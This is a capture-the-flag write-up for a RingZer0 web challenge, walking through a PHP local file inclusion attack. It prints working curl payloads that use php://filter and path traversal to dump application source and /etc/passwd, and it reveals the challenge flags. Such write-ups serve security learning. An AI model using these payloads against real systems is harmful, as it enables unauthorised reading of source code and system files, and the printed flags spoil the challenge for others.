# Register

LINK : https://ringzer0ctf.com/challenges/75


# My Approach
Seems lorem.php will be included

- As given page is GET param which is lorem.php
- Lets try ?page=index.php
- Lets try ?page=ls

**Boom**

```php
Warning: require(ls): failed to open stream: No such file or directory in /var/www/html/index.php on line 43

Fatal error: require(): Failed opening required 'ls' (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/html/index.php on line 43
```

Awesome read before going forward:
> https://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/
> https://peniwize.wordpress.com/2011/04/08/how-to-get-the-command-line-for-any-process-in-linux/
> http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi

 Lets try http://challenges.ringzer0team.com:10075/?page=../../../proc/self/cmdline
Gives /usr/sbin/apache2-kstart
which is location of configuration file

Tried several payloads from above pages.


Finally this gives
```sh
> curl http://challenges.ringzer0team.com:10075/\?page=php://filter/convert.base64-encode/resource=index.php


!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RingZer0 Team CTF - Challenge</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron.css" rel="stylesheet">

  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top" >
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="#" style="color: white;">RingZer0 Team CTF - Challenge</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
		<div class="navbar-form navbar-right">
		</div>
        </div><!--/.navbar-collapse -->
      </div>
    </nav>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
      <div class="container">
        <h1>About Us</h1>
        <p>
	PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsKJGluY2x1ZGUgPSBpc3NldCgkX0dFVFsncGFnZSddKSA/ICRfR0VUWydwYWdlJ10gOiAnbG9yZW0ucGhwJzsKLy8gRkxBRy1NZUNYR0JzckxsWXRkeGx4U2J1bXRVYmI0Sgo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CgogICAgPHRpdGxlPlJpbmdaZXIwIFRlYW0gQ1RGIC0gQ2hhbGxlbmdlPC90aXRsZT4KCiAgICA8IS0tIEJvb3RzdHJhcCBjb3JlIENTUyAtLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+CiAgICA8bGluayBocmVmPSJqdW1ib3Ryb24uY3NzIiByZWw9InN0eWxlc2hlZXQiPgoKICA8L2hlYWQ+CgogIDxib2R5PgoKICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIiA+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+CiAgICAgICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIjIiBzdHlsZT0iY29sb3I6IHdoaXRlOyI+UmluZ1plcjAgVGVhbSBDVEYgLSBDaGFsbGVuZ2U8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBpZD0ibmF2YmFyIiBjbGFzcz0ibmF2YmFyLWNvbGxhcHNlIGNvbGxhcHNlIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItZm9ybSBuYXZiYXItcmlnaHQiPgoJCTwvZGl2PgogICAgICAgIDwvZGl2PjwhLS0vLm5hdmJhci1jb2xsYXBzZSAtLT4KICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8IS0tIE1haW4ganVtYm90cm9uIGZvciBhIHByaW1hcnkgbWFya2V0aW5nIG1lc3NhZ2Ugb3IgY2FsbCB0byBhY3Rpb24gLS0+CiAgICA8ZGl2IGNsYXNzPSJqdW1ib3Ryb24iPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxoMT5BYm91dCBVczwvaDE+CiAgICAgICAgPHA+Cgk8P3BocCByZXF1aXJlKCRpbmNsdWRlKTsgPz4KCTwvcD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAgIDxocj4KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgPGZvb3Rlcj4KICAgICAgICA8cD4mY29weTsgUmluZ1plcjAgVGVhbSBDVEYgMjAxNCAtIDw/cGhwIGVjaG8gZGF0ZSgnWScpOyA/PjwvcD4KICAgICAgPC9mb290ZXI+CiAgICA8L2Rpdj4gPCEtLSAvY29udGFpbmVyIC0tPgogIDwvYm9keT4KPC9odG1sPgoK	</p>
      </div>
    </div>

      <hr>
<div class="container">
      <footer>
        <p>&copy; RingZer0 Team CTF 2014 - 2018</p>
      </footer>
    </div> <!-- /container -->
  </body>
</html>

```

Seems we have base64 version of index.php

lets decode it using https://www.base64decode.org/

Which gives
```php

<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$include = isset($_GET['page']) ? $_GET['page'] : 'lorem.php';
// FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RingZer0 Team CTF - Challenge</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron.css" rel="stylesheet">

  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top" >
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="#" style="color: white;">RingZer0 Team CTF - Challenge</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
		<div class="navbar-form navbar-right">
		</div>
        </div><!--/.navbar-collapse -->
      </div>
    </nav>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
      <div class="container">
        <h1>About Us</h1>
        <p>
	<?php require($include); ?>
	</p>
      </div>
    </div>

      <hr>
<div class="container">
      <footer>
        <p>&copy; RingZer0 Team CTF 2014 - <?php echo date('Y'); ?></p>
      </footer>
    </div> <!-- /container -->
  </body>
</html>

```


Finally we have our flag :D

But this is not accepted :|


- The question name is looking for password file,
- it got to be etc/passwd
- 
Let's try

```sh

> curl http://challenges.ringzer0team.com:10075/\?page=php://filter/convert.base64-encode/resource=../etc/passwd
> curl http://challenges.ringzer0team.com:10075/\?page=php://filter/convert.base64-encode/resource=../../etc/passwd
> curl curl http://challenges.ringzer0team.com:10075/\?page=php://filter/convert.base64-encode/resource=../../../etc/passwd
```

```html
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpGTEFHLXpIOWcxOTM0djc3NFk3Wng1czE2dDV5bThaOi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpsaWJ1dWlkOng6MTAwOjEwMTo6L3Zhci9saWIvbGlidXVpZDoKc3NoZDp4OjEwMTo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA1OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo=

```

We have this base64, lets decode it



```sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:FLAG-YOUR-FLAG-HERE:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
syslog:x:102:105::/home/syslog:/bin/false
```

and I can see now, my flag  :D


